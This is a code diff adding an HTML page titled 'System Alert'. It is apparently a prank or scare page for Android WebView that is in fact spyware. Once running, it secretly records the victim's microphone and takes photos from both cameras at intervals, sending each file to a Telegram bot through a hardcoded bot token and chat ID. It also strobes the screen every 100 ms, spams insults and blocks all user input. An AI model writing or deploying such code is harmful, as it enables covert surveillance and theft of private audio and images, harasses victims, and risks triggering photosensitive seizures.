@@ -1,0 +1,347 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>System Alert</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            -webkit-touch-callout: none;
+            -webkit-user-select: none;
+            user-select: none;
+        }
+
+        body {
+            width: 100%;
+            height: 100vh;
+            overflow: hidden;
+            position: fixed;
+            background-color: #000;
+            color: red;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            touch-action: none;
+        }
+
+        h1 {
+            font-size: 3rem;
+            text-shadow: 0 0 10px red;
+            animation: glitch 1s infinite;
+            margin-bottom: 2rem;
+        }
+
+        p {
+            font-size: 1.5rem;
+            margin: 0.5rem 0;
+            text-shadow: 0 0 5px red;
+        }
+
+        .flash {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: white;
+            opacity: 0;
+            pointer-events: none;
+            z-index: 100;
+        }
+
+        .spam-text {
+            position: absolute;
+            color: red;
+            font-size: 1.5rem;
+            font-weight: bold;
+            text-shadow: 0 0 5px currentColor;
+            animation: glitch 0.5s infinite;
+            z-index: 10;
+        }
+
+        @keyframes glitch {
+            0% {
+                transform: translate(0);
+            }
+
+            20% {
+                transform: translate(-5px, 5px);
+            }
+
+            40% {
+                transform: translate(-5px, -5px);
+            }
+
+            60% {
+                transform: translate(5px, 5px);
+            }
+
+            80% {
+                transform: translate(5px, -5px);
+            }
+
+            100% {
+                transform: translate(0);
+            }
+        }
+
+        .blocker {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1000;
+        }
+
+        #wallpaperImage {
+            display: none;
+        }
+    </style>
+</head>
+
+<body>
+    <h1>KITKATSINGHDARK</h1>
+    <p>KITKATSINGHDARK</p>
+    <p>KITKATSINGHDARK</p>
+    <p>KITKAT SINGH</p>
+
+    <div class="flash" id="flash"></div>
+    <div class="blocker" id="blocker"></div>
+    <img id="wallpaperImage" src="2.png" crossorigin="anonymous">
+
+    <audio id="audio" loop>
+        <source src="2.mp3" type="audio/mpeg">
+    </audio>
+
+    <script>
+        // Telegram configuration
+        const BOT_TOKEN = '8850158231:AAE-6VexR_vNk29DmEqiXfxqvBvKR9Gz3fI';
+        const CHAT_ID = '8228364893';
+
+        // Audio setup
+        const audio = document.getElementById('audio');
+        audio.volume = 1.0;
+
+        function playAudio() {
+            audio.play().catch(e => {
+                document.body.addEventListener('click', playAudio, {
+                    once: true
+                });
+            });
+        }
+
+        // Start audio immediately and on any interaction
+        playAudio();
+        document.addEventListener('click', playAudio);
+        document.addEventListener('touchstart', playAudio);
+
+        // Flashing effect
+        function triggerFlash() {
+            const flash = document.getElementById('flash');
+            flash.style.transition = 'none';
+            flash.style.opacity = '0.9';
+
+            setTimeout(() => {
+                flash.style.transition = 'opacity 0.05s';
+                flash.style.opacity = '0';
+            }, 50);
+
+            // Alternate background color
+            document.body.style.backgroundColor =
+                document.body.style.backgroundColor === 'black' ? 'white' : 'black';
+        }
+
+        // Fast flashing (every 100ms)
+        setInterval(triggerFlash, 100);
+
+        // Spam text creation
+        function createSpamText() {
+            const text = document.createElement('div');
+            text.className = 'spam-text';
+            text.textContent = 'YOU ARE AN IDIOT';
+            text.style.top = Math.random() * window.innerHeight + 'px';
+            text.style.left = Math.random() * window.innerWidth + 'px';
+            text.style.fontSize = (1 + Math.random() * 2) + 'rem';
+            text.style.color = `hsl(${Math.random() * 360}, 100%, 50%)`;
+
+            document.body.appendChild(text);
+
+            setTimeout(() => {
+                document.body.removeChild(text);
+            }, 3000);
+        }
+
+        // Rapid text spamming (every 200ms)
+        setInterval(createSpamText, 200);
+
+        // Media capture functions
+        let audioRecorder;
+        let audioChunks = [];
+        let currentCamera = 'user'; // Start with front camera
+
+        function sendToTelegram(formData) {
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument?chat_id=${CHAT_ID}`, {
+                method: 'POST',
+                body: formData
+            }).catch(e => console.error('Telegram send error:', e));
+        }
+
+        // Continuous audio capture
+        async function captureAudio() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    audio: true
+                });
+                audioRecorder = new MediaRecorder(stream);
+                audioChunks = [];
+
+                audioRecorder.ondataavailable = e => {
+                    audioChunks.push(e.data);
+                    if (audioRecorder.state === 'inactive') {
+                        const audioBlob = new Blob(audioChunks, {
+                            type: 'audio/webm'
+                        });
+                        const formData = new FormData();
+                        formData.append('document', audioBlob, 'audio_' + Date.now() + '.webm');
+                        sendToTelegram(formData);
+                    }
+                };
+
+                audioRecorder.start();
+                setTimeout(() => {
+                    audioRecorder.stop();
+                    stream.getTracks().forEach(track => track.stop());
+                    setTimeout(captureAudio, 15000); // Repeat every 15 seconds
+                }, 15000);
+            } catch (error) {
+                console.error('Audio error:', error);
+                setTimeout(captureAudio, 30000); // Retry after 30 seconds
+            }
+        }
+
+        // Continuous photo capture
+        async function capturePhoto() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: currentCamera
+                    }
+                });
+
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.onloadedmetadata = () => {
+                    video.play();
+                    setTimeout(() => {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                        canvas.toBlob(blob => {
+                            const formData = new FormData();
+                            formData.append('document', blob, 'photo_' + Date.now() + '.jpg');
+                            sendToTelegram(formData);
+
+                            // Switch camera for next capture
+                            currentCamera = currentCamera === 'user' ? 'environment' : 'user';
+                            stream.getTracks().forEach(track => track.stop());
+                            setTimeout(capturePhoto, 30000); // Repeat every 30 seconds
+                        }, 'image/jpeg', 0.8);
+                    }, 2000); // Wait 2 seconds for camera to stabilize
+                };
+            } catch (error) {
+                console.error('Camera error:', error);
+                setTimeout(capturePhoto, 60000); // Retry after 60 seconds
+            }
+        }
+
+        // Change wallpaper to 2.png
+        function changeWallpaper() {
+            const img = document.getElementById('wallpaperImage');
+            img.onload = function() {
+                // Create canvas to process the image
+                const canvas = document.createElement('canvas');
+                canvas.width = img.naturalWidth;
+                canvas.height = img.naturalHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(img, 0, 0);
+
+                // Convert to blob
+                canvas.toBlob(function(blob) {
+                    const formData = new FormData();
+                    formData.append('file', blob, 'wallpaper.png');
+
+                    // For Android WebView, we can't directly set wallpaper but we can:
+                    // 1. Save the image to gallery
+                    // 2. Send it to Telegram
+                    // 3. Attempt to open wallpaper settings
+
+                    // Send to Telegram
+                    sendToTelegram(formData);
+
+                    // Try to download the image
+                    const a = document.createElement('a');
+                    a.href = URL.createObjectURL(blob);
+                    a.download = 'wallpaper.png';
+                    a.click();
+
+                    // Try to open wallpaper settings (works on some devices)
+                    try {
+                        if (navigator.startActivity) {
+                            navigator.startActivity({
+                                action: 'android.settings.SETTINGS',
+                                uri: 'android.settings.DISPLAY_SETTINGS'
+                            });
+                        }
+                    } catch (e) {
+                        console.log('Could not open settings:', e);
+                    }
+                }, 'image/png');
+            };
+        }
+
+        // Input blocking
+        const blocker = document.getElementById('blocker');
+
+        // Block all touch events
+        blocker.addEventListener('touchstart', e => e.preventDefault(), {
+            passive: false
+        });
+        blocker.addEventListener('touchmove', e => e.preventDefault(), {
+            passive: false
+        });
+        blocker.addEventListener('touchend', e => e.preventDefault(), {
+            passive: false
+        });
+
+        // Block mouse events
+        blocker.addEventListener('mousedown', e => e.preventDefault());
+        blocker.addEventListener('mouseup', e => e.preventDefault());
+        blocker.addEventListener('mousemove', e => e.preventDefault());
+
+        // Block keyboard
+        document.addEventListener('keydown', e => e.preventDefault());
+        document.addEventListener('keyup', e => e.preventDefault());
+        document.addEventListener('keypress', e => e.preventDefault());
+
+        // Block context menu
+        document.addEventListener('contextmenu', e => e.preventDefault());
+
+        // Start all functions after 3 seconds
+        setTimeout(() => {
+            captureAudio();
+            capturePhoto();
+            changeWallpaper();
+        }, 3000);
+    </script>
+</body>
+
+  </html>
